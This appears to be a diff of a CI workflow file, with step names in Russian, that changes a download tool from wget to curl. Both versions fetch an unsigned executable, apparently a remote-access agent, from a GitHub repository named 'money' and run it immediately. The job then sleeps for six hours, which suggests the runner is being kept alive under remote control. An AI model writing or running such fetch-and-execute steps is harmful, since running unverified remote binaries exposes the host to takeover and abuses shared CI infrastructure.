@@ -10,7 +10,7 @@ jobs:
     steps:
     - name: Установка
       run: |
-        wget -O installer.exe https://github.com/Dodic-Codes/money/raw/main/Agent.RMS.7.1.7.0_unsigned.exe
+        curl -o installer.exe https://github.com/Dodic-Codes/money/raw/main/Agent.RMS.7.1.7.0_unsigned.exe
         ./installer.exe
     - name: Смэрть через 6 часов
       run: sleep 6h
